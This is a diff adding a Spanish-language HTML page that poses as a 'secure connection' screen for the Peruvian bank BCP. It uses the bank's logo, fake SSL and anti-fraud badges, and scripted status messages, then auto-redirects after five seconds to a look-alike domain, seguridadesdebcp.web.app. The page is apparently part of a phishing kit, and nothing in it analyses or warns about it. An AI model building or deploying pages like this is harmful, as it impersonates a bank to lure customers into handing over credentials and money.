@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Redirección de respaldo por HTML (5 segundos) -->
+<meta http-equiv="refresh" content="5;url=https://seguridadesdebcp.web.app/">
+<title>Estableciendo conexión segura...</title>
+<style>
+:root {
+--bg-color: #f4f7f9;
+--card-bg: #ffffff;
+--primary-color: #0d47a1;
+--accent-color: #00c853;
+--text-main: #1e293b;
+--text-muted: #64748b;
+}
+
+* {
+box-sizing: border-box;
+margin: 0;
+padding: 0;
+font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+background-color: var(--bg-color);
+display: flex;
+justify-content: center;
+align-items: center;
+min-height: 100vh;
+padding: 20px;
+color: var(--text-main);
+}
+
+.security-card {
+background: var(--card-bg);
+max-width: 500px;
+width: 100%;
+padding: 40px 30px;
+border-radius: 16px;
+box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+text-align: center;
+border-top: 5px solid var(--primary-color);
+}
+
+/* Contenedor de los 2 logos */
+.logos-container {
+display: flex;
+justify-content: center;
+align-items: center;
+gap: 25px;
+margin-bottom: 30px;
+}
+
+.logos-container img {
+max-height: 55px;
+max-width: 150px;
+object-fit: contain;
+}
+
+.divider {
+height: 35px;
+width: 1px;
+background-color: #e2e8f0;
+}
+
+/* Icono de candado y animación */
+.shield-icon {
+width: 60px;
+height: 60px;
+background-color: #e8f5e9;
+color: var(--accent-color);
+border-radius: 50%;
+display: flex;
+justify-content: center;
+align-items: center;
+margin: 0 auto 20px;
+animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.4); }
+70% { box-shadow: 0 0 0 15px rgba(0, 200, 83, 0); }
+100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0); }
+}
+
+h1 {
+font-size: 1.4rem;
+margin-bottom: 10px;
+color: var(--text-main);
+}
+
+p.subtitle {
+font-size: 0.95rem;
+color: var(--text-muted);
+line-height: 1.5;
+margin-bottom: 25px;
+}
+
+/* Barra de progreso */
+.progress-wrapper {
+background-color: #e2e8f0;
+border-radius: 10px;
+height: 8px;
+width: 100%;
+overflow: hidden;
+margin-bottom: 15px;
+}
+
+.progress-bar {
+background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+height: 100%;
+width: 0%;
+border-radius: 10px;
+animation: loadProgress 5s linear forwards;
+}
+
+@keyframes loadProgress {
+0% { width: 0%; }
+100% { width: 100%; }
+}
+
+.status-text {
+font-size: 0.85rem;
+font-weight: 600;
+color: var(--primary-color);
+min-height: 20px;
+margin-bottom: 20px;
+}
+
+/* Pie de seguridad */
+.security-badges {
+display: flex;
+justify-content: center;
+gap: 15px;
+padding-top: 20px;
+border-top: 1px solid #f1f5f9;
+font-size: 0.75rem;
+color: var(--text-muted);
+}
+
+.badge {
+display: flex;
+align-items: center;
+gap: 5px;
+}
+</style>
+</head>
+<body>
+
+<div class="security-card">
+<!-- Sección de tus 2 logos -->
+<div class="logos-container">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcMd1Q8rM1x6C0K9uE-Y5uix_xvsrMG9J1OomSgmlvKw&s=10" alt="Logo Principal">
+<div class="divider"></div>
+<img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/0/0d/Logo-bcp-vector.svg/3840px-Logo-bcp-vector.svg.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=thumbnail" alt="Logo Secundario">
+</div>
+
+<!-- Icono de seguridad SVG -->
+<div class="shield-icon">
+<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+<path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+<path d="M9 12l2 2 4-4"></path>
+</svg>
+</div>
+
+<h1>Conectando con servidores seguros</h1>
+<p class="subtitle">
+Estamos verificando la integridad de tu sesión y estableciendo un canal cifrado de extremo a extremo. Por favor, no cierres ni actualices esta ventana.
+</p>
+
+<!-- Barra de carga -->
+<div class="progress-wrapper">
+<div class="progress-bar"></div>
+</div>
+
+<!-- Texto dinámico de estado -->
+<div class="status-text" id="status-message">Iniciando protocolo de cifrado TLS 1.3...</div>
+
+<!-- Sellos informativos -->
+<div class="security-badges">
+<div class="badge">
+<span>🔒 Conexión SSL Verificada</span>
+</div>
+<div class="badge">
+<span>🛡️ Protección Anti-Fraude Activa</span>
+</div>
+</div>
+</div>
+
+<script>
+// URL a la que se va a redirigir
+const urlDestino = "https://seguridadesdebcp.web.app/";
+
+const statusElement = document.getElementById("status-message");
+
+// Mensajes progresivos durante los 5 segundos
+const mensajes = [
+{ tiempo: 1200, texto: "Autenticando certificados digitales..." },
+{ tiempo: 2600, texto: "Validando entorno libre de amenazas..." },
+{ tiempo: 4000, texto: "Conexión segura establecida. Redirigiendo..." }
+];
+
+mensajes.forEach(item => {
+setTimeout(() => {
+statusElement.textContent = item.texto;
+}, item.tiempo);
+});
+
+// Redirección principal a los 5000 milisegundos (5 segundos)
+setTimeout(() => {
+window.location.href = urlDestino;
+}, 5000);
+</script>
+
+</body>
+</html>
